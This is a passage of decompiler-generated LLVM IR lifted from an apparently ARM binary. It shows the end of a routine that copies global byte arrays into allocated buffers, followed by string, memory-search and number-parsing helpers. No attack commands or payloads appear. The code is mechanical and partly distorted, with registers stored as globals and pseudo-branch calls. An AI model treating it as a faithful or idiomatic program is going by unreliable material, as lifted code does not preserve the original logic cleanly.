  store i32 %v0_10650, i32* @r5, align 4
  %v4_10664 = call i32 @util_memcpy(i32 %v0_10650, i32 ptrtoint ([9 x i8]* @global_var_19874.293 to i32), i32 8)
  %v0_10668 = load i32, i32* @r7, align 4
  store i32 %v0_10668, i32* @r0, align 4
  %v0_1066c = load i32, i32* @r5, align 4
  store i32 %v0_1066c, i32* @global_var_24e60.294, align 4
  %v0_10670 = load i32, i32* @r6, align 4
  %v1_10670 = trunc i32 %v0_10670 to i16
  store i16 %v1_10670, i16* bitcast (i32* @global_var_24e64.295 to i16*), align 4
  %v0_10674 = call i32 @malloc()
  %v0_1067c = load i32, i32* @r7, align 4
  store i32 %v0_10674, i32* @r5, align 4
  %v4_10684 = call i32 @util_memcpy(i32 %v0_10674, i32 ptrtoint ([8 x i8]* @global_var_19880.297 to i32), i32 %v0_1067c)
  %v0_10688 = load i32, i32* @sl, align 4
  store i32 %v0_10688, i32* @r0, align 4
  %v0_1068c = load i32, i32* @r5, align 4
  store i32 %v0_1068c, i32* @global_var_24e68.298, align 4
  %v0_10690 = load i32, i32* @r7, align 4
  %v1_10690 = trunc i32 %v0_10690 to i16
  store i16 %v1_10690, i16* bitcast (i32* @global_var_24e6c.299 to i16*), align 4
  %v0_10694 = call i32 @malloc()
  %v0_1069c = load i32, i32* @sl, align 4
  store i32 %v0_10694, i32* @r5, align 4
  %v4_106a4 = call i32 @util_memcpy(i32 %v0_10694, i32 ptrtoint ([17 x i8]* @global_var_19888.301 to i32), i32 %v0_1069c)
  %v0_106a8 = load i32, i32* @r6, align 4
  store i32 %v0_106a8, i32* @r0, align 4
  %v0_106ac = load i32, i32* @r5, align 4
  store i32 %v0_106ac, i32* @global_var_24e08.302, align 4
  %v0_106b0 = load i32, i32* @sl, align 4
  %v1_106b0 = trunc i32 %v0_106b0 to i16
  store i16 %v1_106b0, i16* bitcast (i32* @global_var_24e0c.303 to i16*), align 4
  %v0_106b4 = call i32 @malloc()
  %v0_106bc = load i32, i32* @r6, align 4
  store i32 %v0_106b4, i32* @r5, align 4
  %v4_106c4 = call i32 @util_memcpy(i32 %v0_106b4, i32 ptrtoint ([9 x i8]* @global_var_1989c.305 to i32), i32 %v0_106bc)
  store i32 21, i32* @r0, align 4
  %v0_106cc = load i32, i32* @r5, align 4
  store i32 %v0_106cc, i32* @global_var_24e10.306, align 4
  %v0_106d0 = load i32, i32* @r6, align 4
  %v1_106d0 = trunc i32 %v0_106d0 to i16
  store i16 %v1_106d0, i16* bitcast (i32* @global_var_24e14.307 to i16*), align 4
  %v0_106d4 = call i32 @malloc()
  store i32 %v0_106d4, i32* @r5, align 4
  %v3_106e4 = call i32 @util_memcpy(i32 %v0_106d4, i32 ptrtoint (i32* @global_var_19944.309 to i32), i32 21)
  store i32 17, i32* @r0, align 4
  store i16 21, i16* bitcast (i32* @global_var_24e1c.310 to i16*), align 4
  %v0_106f4 = load i32, i32* @r5, align 4
  store i32 %v0_106f4, i32* @global_var_24e18.311, align 4
  %v0_106f8 = call i32 @malloc()
  store i32 %v0_106f8, i32* @r5, align 4
  %v4_10708 = call i32 @util_memcpy(i32 %v0_106f8, i32 ptrtoint ([18 x i8]* @global_var_198a8.313 to i32), i32 17)
  store i32 12, i32* @r0, align 4
  store i16 17, i16* bitcast (i32* @global_var_24e24.314 to i16*), align 4
  %v0_10718 = load i32, i32* @r5, align 4
  store i32 %v0_10718, i32* @global_var_24e20.315, align 4
  %v0_1071c = call i32 @malloc()
  store i32 %v0_1071c, i32* @r5, align 4
  %v4_1072c = call i32 @util_memcpy(i32 %v0_1071c, i32 ptrtoint ([13 x i8]* @global_var_198bc.317 to i32), i32 12)
  %v0_10734 = load i32, i32* @r8, align 4
  store i32 %v0_10734, i32* @r0, align 4
  store i16 12, i16* bitcast (i32* @global_var_24e2c.318 to i16*), align 4
  %v0_1073c = load i32, i32* @r5, align 4
  store i32 %v0_1073c, i32* @global_var_24e28.319, align 4
  %v0_10740 = call i32 @malloc()
  %v0_10748 = load i32, i32* @r8, align 4
  store i32 %v0_10740, i32* @r5, align 4
  %v4_10750 = call i32 @util_memcpy(i32 %v0_10740, i32 ptrtoint ([15 x i8]* @global_var_198cc.321 to i32), i32 %v0_10748)
  store i32 19, i32* @r0, align 4
  %v0_10758 = load i32, i32* @r5, align 4
  store i32 %v0_10758, i32* @global_var_24e30.322, align 4
  %v0_1075c = load i32, i32* @r8, align 4
  %v1_1075c = trunc i32 %v0_1075c to i16
  store i16 %v1_1075c, i16* bitcast (i32* @global_var_24e34.323 to i16*), align 4
  %v0_10760 = call i32 @malloc()
  store i32 %v0_10760, i32* @r5, align 4
  %v4_10770 = call i32 @util_memcpy(i32 %v0_10760, i32 ptrtoint ([20 x i8]* @global_var_198dc.325 to i32), i32 19)
  %v0_10778 = load i32, i32* @r6, align 4
  store i32 %v0_10778, i32* @r0, align 4
  store i16 19, i16* bitcast (i32* @global_var_24e3c.326 to i16*), align 4
  %v0_10780 = load i32, i32* @r5, align 4
  store i32 %v0_10780, i32* @global_var_24e38.327, align 4
  %v0_10784 = call i32 @malloc()
  %v0_1078c = load i32, i32* @r6, align 4
  store i32 %v0_10784, i32* @r5, align 4
  %v4_10794 = call i32 @util_memcpy(i32 %v0_10784, i32 ptrtoint ([9 x i8]* @global_var_198f0.329 to i32), i32 %v0_1078c)
  %v0_10798 = load i32, i32* @fp, align 4
  store i32 %v0_10798, i32* @r0, align 4
  %v0_1079c = load i32, i32* @r5, align 4
  store i32 %v0_1079c, i32* @global_var_24e40.330, align 4
  %v0_107a0 = load i32, i32* @r6, align 4
  %v1_107a0 = trunc i32 %v0_107a0 to i16
  store i16 %v1_107a0, i16* bitcast (i32* @global_var_24e44.331 to i16*), align 4
  %v0_107a4 = call i32 @malloc()
  %v0_107ac = load i32, i32* @fp, align 4
  store i32 %v0_107a4, i32* @r5, align 4
  %v4_107b4 = call i32 @util_memcpy(i32 %v0_107a4, i32 ptrtoint ([6 x i8]* @global_var_198fc.333 to i32), i32 %v0_107ac)
  %v0_107b8 = load i32, i32* @sb, align 4
  store i32 %v0_107b8, i32* @r0, align 4
  %v0_107bc = load i32, i32* @r5, align 4
  store i32 %v0_107bc, i32* @global_var_24e48.334, align 4
  %v0_107c0 = load i32, i32* @fp, align 4
  %v1_107c0 = trunc i32 %v0_107c0 to i16
  store i16 %v1_107c0, i16* bitcast (i32* @global_var_24e4c.335 to i16*), align 4
  %v0_107c4 = call i32 @malloc()
  %v0_107cc = load i32, i32* @sb, align 4
  store i32 %v0_107c4, i32* @r5, align 4
  %v4_107d4 = call i32 @util_memcpy(i32 %v0_107c4, i32 ptrtoint ([7 x i8]* @global_var_19904.337 to i32), i32 %v0_107cc)
  store i32 23, i32* @r0, align 4
  %v0_107dc = load i32, i32* @r5, align 4
  store i32 %v0_107dc, i32* @global_var_24e50.338, align 4
  %v0_107e0 = load i32, i32* @sb, align 4
  %v1_107e0 = trunc i32 %v0_107e0 to i16
  store i16 %v1_107e0, i16* bitcast (i32* @global_var_24e54.339 to i16*), align 4
  %v0_107e4 = call i32 @malloc()
  %v4_107f4 = call i32 @util_memcpy(i32 %v0_107e4, i32 ptrtoint ([24 x i8]* @global_var_1990c.341 to i32), i32 23)
  store i32 %v0_107e4, i32* @global_var_24e58.342, align 4
  store i16 23, i16* bitcast (i32* @global_var_24e5c.343 to i16*), align 4
  store i32 %v3_103ec, i32* @r4, align 4
  store i32 %v6_103ec, i32* @r5, align 4
  store i32 %v9_103ec, i32* @r6, align 4
  store i32 %v12_103ec, i32* @r7, align 4
  store i32 %v15_103ec, i32* @r8, align 4
  store i32 %v18_103ec, i32* @sb, align 4
  store i32 %v21_103ec, i32* @sl, align 4
  store i32 %v24_103ec, i32* @fp, align 4
  ret i32 %v4_107f4

; uselistorder directives
  uselistorder i32 %v0_107c4, { 1, 0 }
  uselistorder i32 %v0_107a4, { 1, 0 }
  uselistorder i32 %v0_10784, { 1, 0 }
  uselistorder i32 %v0_10740, { 1, 0 }
  uselistorder i32 %v0_106b4, { 1, 0 }
  uselistorder i32 %v0_10694, { 1, 0 }
  uselistorder i32 %v0_10674, { 1, 0 }
  uselistorder i32 %v0_10650, { 1, 0 }
  uselistorder i32 %v0_1060c, { 1, 0 }
  uselistorder i32 %v0_105a4, { 1, 0 }
  uselistorder i32 %v0_104ac, { 1, 0 }
  uselistorder i32 %v0_1048c, { 1, 0 }
  uselistorder i32 %v0_10464, { 1, 0 }
  uselistorder i32 %v0_10420, { 1, 0 }
  uselistorder i32 %v0_103f8, { 1, 0 }
  uselistorder i32 23, { 0, 4, 1, 2, 3 }
  uselistorder i32 29, { 0, 3, 4, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @util_memcpy, { 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 0, 7, 6, 5, 3, 2, 1, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_24d78.217 to i32), { 4, 0, 1, 2, 3, 5 }
}

define i32 @util_strlen(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_10890 = load i8, i8* %arg1, align 1
  %v2_10894 = icmp eq i8 %v3_10890, 0
  %v0_10898 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10894, i32 %v0_10898)
  br label %dec_label_pc_108a0

dec_label_pc_108a0:                               ; preds = %dec_label_pc_108a0, %entry
  %v0_108a0 = phi i32 [ %v1_108a0, %dec_label_pc_108a0 ], [ 0, %entry ]
  %v1_108a0 = add i32 %v0_108a0, 1
  %v2_108a4 = add i32 %v1_108a0, %tmp
  %v3_108a4 = inttoptr i32 %v2_108a4 to i8*
  %v4_108a4 = load i8, i8* %v3_108a4, align 1
  %v6_108a4 = zext i8 %v4_108a4 to i32
  store i32 %v6_108a4, i32* @r3, align 4
  %v2_108a8 = icmp eq i8 %v4_108a4, 0
  br i1 %v2_108a8, label %dec_label_pc_108b0, label %dec_label_pc_108a0

dec_label_pc_108b0:                               ; preds = %dec_label_pc_108a0
  ret i32 %v1_108a0
}

define i32 @util_strcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @r1, align 4
  %v2_108b4 = load i8, i8* %arg1, align 1
  %v3_108b4 = zext i8 %v2_108b4 to i32
  store i32 %v3_108b4, i32* @r2, align 4
  %v2_108b8 = icmp eq i8 %v2_108b4, 0
  br i1 %v2_108b8, label %bb, label %dec_label_pc_108c4

bb:                                               ; preds = %entry
  store i32 %v3_108b4, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_108d8

dec_label_pc_108c4:                               ; preds = %entry
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_108c8

dec_label_pc_108c8:                               ; preds = %dec_label_pc_108c8, %dec_label_pc_108c4
  %v0_108c8 = phi i32 [ %v1_108c8, %dec_label_pc_108c8 ], [ 0, %dec_label_pc_108c4 ]
  %v1_108c8 = add i32 %v0_108c8, 1
  store i32 %v1_108c8, i32* %ip.global-to-local, align 4
  %v2_108cc = add i32 %v1_108c8, %tmp
  %v3_108cc = inttoptr i32 %v2_108cc to i8*
  %v4_108cc = load i8, i8* %v3_108cc, align 1
  %v2_108d0 = icmp eq i8 %v4_108cc, 0
  br i1 %v2_108d0, label %dec_label_pc_108d8, label %dec_label_pc_108c8

dec_label_pc_108d8:                               ; preds = %dec_label_pc_108c8, %bb
  %v0_108d8 = phi i32 [ %v3_108b4, %bb ], [ %v1_108c8, %dec_label_pc_108c8 ]
  br label %dec_label_pc_108e4

dec_label_pc_108e0:                               ; preds = %dec_label_pc_108e4
  %v0_108e0 = load i32, i32* @r1, align 4
  %v1_108e0 = add i32 %v0_108e0, 1
  %v2_108e0 = inttoptr i32 %v1_108e0 to i8*
  %v3_108e0 = load i8, i8* %v2_108e0, align 1
  %v4_108e0 = zext i8 %v3_108e0 to i32
  store i32 %v4_108e0, i32* @r2, align 4
  store i32 %v1_108e0, i32* @r1, align 4
  %v0_108e4.pr = load i32, i32* @r3, align 4
  br label %dec_label_pc_108e4

dec_label_pc_108e4:                               ; preds = %dec_label_pc_108d8, %dec_label_pc_108e0
  %v0_108ec.off0 = phi i8 [ %v2_108b4, %dec_label_pc_108d8 ], [ %v3_108e0, %dec_label_pc_108e0 ]
  %v0_108e4 = phi i32 [ %v0_108d8, %dec_label_pc_108d8 ], [ %v0_108e4.pr, %dec_label_pc_108e0 ]
  %v1_108e4 = add i32 %v0_108e4, -1
  store i32 %v1_108e4, i32* @r3, align 4
  %v3_108e8 = icmp eq i32 %v0_108e4, 0
  %v2_108ec = load i32, i32* @r0, align 4
  %v3_108ec = inttoptr i32 %v2_108ec to i8*
  store i8 %v0_108ec.off0, i8* %v3_108ec, align 1
  %v4_108ec = load i32, i32* @r0, align 4
  %v5_108ec = add i32 %v4_108ec, 1
  store i32 %v5_108ec, i32* @r0, align 4
  br i1 %v3_108e8, label %dec_label_pc_108f4, label %dec_label_pc_108e0

dec_label_pc_108f4:                               ; preds = %dec_label_pc_108e4
  %v0_108f4 = load i32, i32* %ip.global-to-local, align 4
  ret i32 %v0_108f4

; uselistorder directives
  uselistorder i32 %v0_108e4, { 1, 0 }
  uselistorder i32 %v1_108c8, { 0, 1, 3, 2 }
  uselistorder i32* %ip.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_108e4, { 1, 0 }
}

define i32 @util_memcpy(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %v2_108fc = icmp eq i32 %arg3, 0
  %v0_10900 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_108fc, i32 %v0_10900)
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_10908

dec_label_pc_10908:                               ; preds = %dec_label_pc_10908, %entry
  %v0_10908 = phi i32 [ %v1_10910, %dec_label_pc_10908 ], [ 0, %entry ]
  %v2_10908 = add i32 %v0_10908, %arg2
  %v3_10908 = inttoptr i32 %v2_10908 to i8*
  %v4_10908 = load i8, i8* %v3_10908, align 1
  %v4_1090c = add i32 %v0_10908, %arg1
  %v5_1090c = inttoptr i32 %v4_1090c to i8*
  store i8 %v4_10908, i8* %v5_1090c, align 1
  %v0_10910 = load i32, i32* %ip.global-to-local, align 4
  %v1_10910 = add i32 %v0_10910, 1
  store i32 %v1_10910, i32* %ip.global-to-local, align 4
  %v9_10914 = icmp eq i32 %v1_10910, %arg3
  br i1 %v9_10914, label %dec_label_pc_1091c, label %dec_label_pc_10908

dec_label_pc_1091c:                               ; preds = %dec_label_pc_10908
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %v1_10910, { 1, 2, 0 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @util_zero() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %v0_10920 = load i32, i32* @r1, align 4
  %v2_10920 = icmp eq i32 %v0_10920, 0
  %v0_10924 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_10920, i32 %v0_10924)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1092c

dec_label_pc_1092c:                               ; preds = %dec_label_pc_1092c, %entry
  %v2_10930 = phi i32 [ %v1_10934, %dec_label_pc_1092c ], [ 0, %entry ]
  store i32 0, i32* @r3, align 4
  %v3_10930 = load i32, i32* @r0, align 4
  %v4_10930 = add i32 %v3_10930, %v2_10930
  %v5_10930 = inttoptr i32 %v4_10930 to i8*
  store i8 0, i8* %v5_10930, align 1
  %v0_10934 = load i32, i32* %r2.global-to-local, align 4
  %v1_10934 = add i32 %v0_10934, 1
  store i32 %v1_10934, i32* %r2.global-to-local, align 4
  %v1_10938 = load i32, i32* @r1, align 4
  %v9_10938 = icmp eq i32 %v1_10934, %v1_10938
  br i1 %v9_10938, label %dec_label_pc_10940, label %dec_label_pc_1092c

dec_label_pc_10940:                               ; preds = %dec_label_pc_1092c
  %v1_10940 = load i32, i32* @r0, align 4
  ret i32 %v1_10940

; uselistorder directives
  uselistorder i32 %v1_10934, { 1, 2, 0 }
}

define i32 @util_memsearch(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v7_10958 = icmp sgt i32 %arg4, %arg2
  br i1 %v7_10958, label %dec_label_pc_10960, label %dec_label_pc_10968

dec_label_pc_10960:                               ; preds = %dec_label_pc_1097c, %dec_label_pc_10968, %entry, %dec_label_pc_109a8
  %storemerge = phi i32 [ %v1_109a8, %dec_label_pc_109a8 ], [ -1, %entry ], [ -1, %dec_label_pc_10968 ], [ -1, %dec_label_pc_1097c ]
  ret i32 %storemerge

dec_label_pc_10968:                               ; preds = %entry
  %tmp12 = icmp slt i32 %arg2, 1
  br i1 %tmp12, label %dec_label_pc_10960, label %dec_label_pc_10970

dec_label_pc_10970:                               ; preds = %dec_label_pc_10968
  br label %dec_label_pc_10988

dec_label_pc_1097c:                               ; preds = %bb, %dec_label_pc_1099c
  %v1_109883 = phi i32 [ %v1_1099c, %dec_label_pc_1099c ], [ 0, %bb ]
  %v1_1097c = add i32 %v0_109a8, 1
  %v9_10980 = icmp eq i32 %v1_1097c, %arg2
  br i1 %v9_10980, label %dec_label_pc_10960, label %dec_label_pc_10988

dec_label_pc_10988:                               ; preds = %dec_label_pc_1097c, %dec_label_pc_10970
  %v0_109a8 = phi i32 [ %v1_1097c, %dec_label_pc_1097c ], [ 0, %dec_label_pc_10970 ]
  %v1_10988 = phi i32 [ %v1_109883, %dec_label_pc_1097c ], [ 0, %dec_label_pc_10970 ]
  %v2_10988 = add i32 %v1_10988, %arg3
  %v3_10988 = inttoptr i32 %v2_10988 to i8*
  %v4_10988 = load i8, i8* %v3_10988, align 1
  %v2_1098c = add i32 %v0_109a8, %arg1
  %v3_1098c = inttoptr i32 %v2_1098c to i8*
  %v4_1098c = load i8, i8* %v3_1098c, align 1
  %v9_10990 = icmp eq i8 %v4_1098c, %v4_10988
  br i1 %v9_10990, label %dec_label_pc_1099c, label %bb

bb:                                               ; preds = %dec_label_pc_10988
  store i32 0, i32* @ip, align 4
  br label %dec_label_pc_1097c

dec_label_pc_1099c:                               ; preds = %dec_label_pc_10988
  %v1_1099c = add i32 %v1_10988, 1
  store i32 %v1_1099c, i32* @ip, align 4
  %v9_109a0 = icmp eq i32 %v1_1099c, %arg4
  br i1 %v9_109a0, label %dec_label_pc_109a8, label %dec_label_pc_1097c

dec_label_pc_109a8:                               ; preds = %dec_label_pc_1099c
  %v1_109a8 = add i32 %v0_109a8, 1
  br label %dec_label_pc_10960

; uselistorder directives
  uselistorder i32 %v1_1099c, { 1, 2, 0 }
  uselistorder i32 %v1_10988, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1097c, { 1, 0 }
  uselistorder label %dec_label_pc_10960, { 3, 0, 1, 2 }
}

define i32 @util_atoi(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  br label %dec_label_pc_109c0

dec_label_pc_109c0:                               ; preds = %.thread, %dec_label_pc_109d4, %bb, %entry
  %v0_109c0 = phi i32 [ %tmp, %entry ], [ %v5_109c0, %bb ], [ %v5_109c0, %dec_label_pc_109d4 ], [ %v5_109c0, %.thread ]
  %v1_109c0 = inttoptr i32 %v0_109c0 to i8*
  %v2_109c0 = load i8, i8* %v1_109c0, align 1
  %v5_109c0 = add i32 %v0_109c0, 1
  %v7_109c4 = icmp eq i8 %v2_109c0, 9
  br i1 %v7_109c4, label %.thread, label %bb

.thread:                                          ; preds = %dec_label_pc_109c0
  br label %dec_label_pc_109c0

bb:                                               ; preds = %dec_label_pc_109c0
  %v8_109c8 = icmp eq i8 %v2_109c0, 32
  br i1 %v8_109c8, label %dec_label_pc_109c0, label %dec_label_pc_109d4

dec_label_pc_109d4:                               ; preds = %bb
  %v7_109d4 = icmp eq i8 %v2_109c0, 10
  br i1 %v7_109d4, label %dec_label_pc_109c0, label %dec_label_pc_109dc

dec_label_pc_109dc:                               ; preds = %dec_label_pc_109d4
  %v7_109dc = icmp eq i8 %v2_109c0, 45
  br i1 %v7_109dc, label %dec_label_pc_10acc, label %dec_label_pc_109e4

dec_label_pc_109e4:                               ; preds = %dec_label_pc_109dc
  %v7_109e4 = icmp eq i8 %v2_109c0, 43
  br i1 %v7_109e4, label %bb54, label %dec_label_pc_109f4

bb54:                                             ; preds = %dec_label_pc_109e4
  %v2_109e8 = inttoptr i32 %v5_109c0 to i8*
  %v3_109e8 = load i8, i8* %v2_109e8, align 1
  %v6_109e8 = add i32 %v0_109c0, 2
  br label %dec_label_pc_109f4

dec_label_pc_109f4:                               ; preds = %bb54, %dec_label_pc_109e4, %dec_label_pc_10acc
  %v1_10a9c39 = phi i32 [ %v5_10acc, %dec_label_pc_10acc ], [ %v5_109c0, %dec_label_pc_109e4 ], [ %v6_109e8, %bb54 ]
  %v0_10a1c10.in = phi i8 [ %v2_10acc, %dec_label_pc_10acc ], [ %v2_109c0, %dec_label_pc_109e4 ], [ %v3_109e8, %bb54 ]
  %storemerge1 = phi i32 [ -2147483648, %dec_label_pc_10acc ], [ 2147483647, %dec_label_pc_109e4 ], [ 2147483647, %bb54 ]
  %v0_10adc = phi i32 [ 1, %dec_label_pc_10acc ], [ 0, %dec_label_pc_109e4 ], [ 0, %bb54 ]
  %v2_109fc = udiv i32 %storemerge1, %arg2
  %v3_109fc = urem i32 %storemerge1, %arg2
  br label %dec_label_pc_10a1c.outer

dec_label_pc_10a1c.outer:                         ; preds = %.thread5, %dec_label_pc_109f4
  %v1_10a9c.ph = phi i32 [ %v6_10a9c, %.thread5 ], [ %v1_10a9c39, %dec_label_pc_109f4 ]
  %v2_10a98.ph = phi i32 [ %v5_10a98, %.thread5 ], [ 0, %dec_label_pc_109f4 ]
  %v1_10a5c.ph.in = phi i8 [ %v3_10a9c, %.thread5 ], [ %v0_10a1c10.in, %dec_label_pc_109f4 ]
  %v1_10a74.ph = phi i32 [ 1, %.thread5 ], [ 0, %dec_label_pc_109f4 ]
  %v3_10a68 = icmp uge i32 %v2_10a98.ph, %v2_109fc
  %v9_10a68 = icmp eq i32 %v2_10a98.ph, %v2_109fc
  %v2_10a6c = xor i1 %v3_10a68, true
  %v3_10a6c = or i1 %v9_10a68, %v2_10a6c
  %v2_10a70 = xor i1 %v9_10a68, true
  %v3_10a70 = and i1 %v3_10a68, %v2_10a70
  %v2_10a90 = icmp eq i1 %v9_10a68, false
  br label %dec_label_pc_10a1c

dec_label_pc_10a1c:                               ; preds = %dec_label_pc_10a1c.outer, %dec_label_pc_10aa4
  %v1_10a9c = phi i32 [ %v5_10aa4, %dec_label_pc_10aa4 ], [ %v1_10a9c.ph, %dec_label_pc_10a1c.outer ]
  %v1_10a74 = phi i32 [ -1, %dec_label_pc_10aa4 ], [ %v1_10a74.ph, %dec_label_pc_10a1c.outer ]
  %v1_10a5c.in = phi i8 [ %v2_10aa4, %dec_label_pc_10aa4 ], [ %v1_10a5c.ph.in, %dec_label_pc_10a1c.outer ]
  %v1_10a5c = zext i8 %v1_10a5c.in to i32
  %v1_10a1c = urem i32 %v1_10a5c, 256
  %v1_10a20 = add nsw i32 %v1_10a1c, -48
  %v1_10a28 = add nsw i32 %v1_10a1c, -97
  %v1_10a2c = add nsw i32 %v1_10a5c, -48
  %v1_10a30 = add nsw i32 %v1_10a1c, -65
  %tmp87 = icmp ult i32 %v1_10a20, 10
  br i1 %tmp87, label %dec_label_pc_10a60, label %dec_label_pc_10a38

dec_label_pc_10a38:                               ; preds = %dec_label_pc_10a1c
  %v2_10a38 = icmp ugt i32 %v1_10a30, 24
  %v7_10a38 = icmp eq i32 %v1_10a30, 25
  %v2_10a3c = xor i1 %v7_10a38, true
  %v3_10a3c = and i1 %v2_10a38, %v2_10a3c
  br i1 %v3_10a3c, label %bb55, label %bb56

bb55:                                             ; preds = %dec_label_pc_10a38
  br label %bb56

bb56:                                             ; preds = %dec_label_pc_10a38, %bb55
  %v0_10a5015 = phi i32 [ %v1_10a2c, %dec_label_pc_10a38 ], [ 0, %bb55 ]
  %v2_10a40 = xor i1 %v2_10a38, true
  %v3_10a40 = or i1 %v7_10a38, %v2_10a40
  br i1 %v3_10a40, label %bb57, label %bb58

bb57:                                             ; preds = %bb56
  br label %bb58

bb58:                                             ; preds = %bb56, %bb57
  %v0_10a50 = phi i32 [ %v0_10a5015, %bb56 ], [ 1, %bb57 ]
  br i1 %v3_10a3c, label %bb59, label %bb60

bb59:                                             ; preds = %bb58
  %v6_10a48 = icmp ugt i32 %v1_10a28, 24
  %v11_10a48 = icmp eq i32 %v1_10a28, 25
  br label %bb60

bb60:                                             ; preds = %bb58, %bb59
  %v1_10a4c = phi i1 [ %v7_10a38, %bb58 ], [ %v11_10a48, %bb59 ]
  %v0_10a4c = phi i1 [ %v2_10a38, %bb58 ], [ %v6_10a48, %bb59 ]
  %v2_10a4c = xor i1 %v1_10a4c, true
  %v3_10a4c = and i1 %v0_10a4c, %v2_10a4c
  br i1 %v3_10a4c, label %dec_label_pc_10ab0, label %dec_label_pc_10a50

dec_label_pc_10a50:                               ; preds = %bb60
  %v2_10a50 = icmp eq i32 %v0_10a50, 0
  %. = select i1 %v2_10a50, i32 87, i32 55
  %v2_10a5c = sub nsw i32 %v1_10a5c, %.
  br label %dec_label_pc_10a60

dec_label_pc_10a60:                               ; preds = %dec_label_pc_10a1c, %dec_label_pc_10a50
  %v0_10a7433 = phi i32 [ %v1_10a30, %dec_label_pc_10a1c ], [ %., %dec_label_pc_10a50 ]
  %v3_10a98 = phi i32 [ %v1_10a2c, %dec_label_pc_10a1c ], [ %v2_10a5c, %dec_label_pc_10a50 ]
  %v2_10a60 = sub i32 %v3_10a98, %arg2
  %v4_10a60 = xor i32 %v3_10a98, %arg2
  %v5_10a60 = xor i32 %v2_10a60, %v3_10a98
  %v6_10a60 = and i32 %v5_10a60, %v4_10a60
  %v7_10a60 = icmp slt i32 %v6_10a60, 0
  %v8_10a60 = icmp slt i32 %v2_10a60, 0
  %v2_10a64 = xor i1 %v8_10a60, %v7_10a60
  br i1 %v2_10a64, label %dec_label_pc_10a68, label %dec_label_pc_10ab0

dec_label_pc_10a68:                               ; preds = %dec_label_pc_10a60
  br i1 %v3_10a6c, label %bb63, label %bb64

bb63:                                             ; preds = %dec_label_pc_10a68
  br label %bb64

bb64:                                             ; preds = %dec_label_pc_10a68, %bb63
  %v0_10a7432 = phi i32 [ %v0_10a7433, %dec_label_pc_10a68 ], [ 0, %bb63 ]
  br i1 %v3_10a70, label %bb65, label %bb66

bb65:                                             ; preds = %bb64
  br label %bb66

bb66:                                             ; preds = %bb64, %bb65
  %v0_10a74 = phi i32 [ %v0_10a7432, %bb64 ], [ 1, %bb65 ]
  %tmp88 = icmp slt i32 %v1_10a74, 0
  %v4_10a74 = zext i1 %tmp88 to i32
  %v5_10a74 = or i32 %v0_10a74, %v4_10a74
  %v7_10a74 = icmp eq i32 %v5_10a74, 0
  br i1 %v7_10a74, label %dec_label_pc_10a7c, label %dec_label_pc_10aa4

dec_label_pc_10a7c:                               ; preds = %bb66
  %v2_10a88 = sub i32 %v3_10a98, %v3_109fc
  %v4_10a88 = xor i32 %v3_10a98, %v3_109fc
  %v5_10a88 = xor i32 %v2_10a88, %v3_10a98
  %v6_10a88 = and i32 %v5_10a88, %v4_10a88
  %v7_10a88 = icmp slt i32 %v6_10a88, 0
  %v8_10a88 = icmp slt i32 %v2_10a88, 0
  %v9_10a88 = icmp eq i32 %v3_10a98, %v3_109fc
  %v3_10a8c = xor i1 %v8_10a88, %v7_10a88
  %v4_10a8c = or i1 %v9_10a88, %v3_10a8c
  br i1 %v4_10a8c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_10a7c
  br label %.thread5

thread-pre-split:                                 ; preds = %dec_label_pc_10a7c
  br i1 %v2_10a90, label %.thread5, label %dec_label_pc_10aa4

.thread5:                                         ; preds = %thread-pre-split, %thread-pre-split.thread
  %v4_10a98 = mul i32 %v2_10a98.ph, %arg2
  %v5_10a98 = add i32 %v3_10a98, %v4_10a98
  %v2_10a9c = inttoptr i32 %v1_10a9c to i8*
  %v3_10a9c = load i8, i8* %v2_10a9c, align 1
  %v6_10a9c = add i32 %v1_10a9c, 1
  br label %dec_label_pc_10a1c.outer

dec_label_pc_10aa4:                               ; preds = %thread-pre-split, %bb66
  %v1_10aa4 = inttoptr i32 %v1_10a9c to i8*
  %v2_10aa4 = load i8, i8* %v1_10aa4, align 1
  %v5_10aa4 = add i32 %v1_10a9c, 1
  br label %dec_label_pc_10a1c

dec_label_pc_10ab0:                               ; preds = %dec_label_pc_10a60, %bb60
  %v1_10ab0 = icmp slt i32 %v1_10a74, 0
  %v2_10adc = icmp eq i32 %v0_10adc, 0
  br i1 %v1_10ab0, label %dec_label_pc_10adc, label %dec_label_pc_10ab8

dec_label_pc_10ab8:                               ; preds = %dec_label_pc_10ab0
  br i1 %v2_10adc, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_10ab8
  %v2_10abc = sub i32 0, %v2_10a98.ph
  br label %bb70

bb70:                                             ; preds = %.thread43, %bb71, %dec_label_pc_10ab8, %bb69
  %v1_10ac8 = phi i32 [ -2147483648, %bb71 ], [ %v2_10a98.ph, %dec_label_pc_10ab8 ], [ %v2_10abc, %bb69 ], [ 2147483647, %.thread43 ]
  ret i32 %v1_10ac8

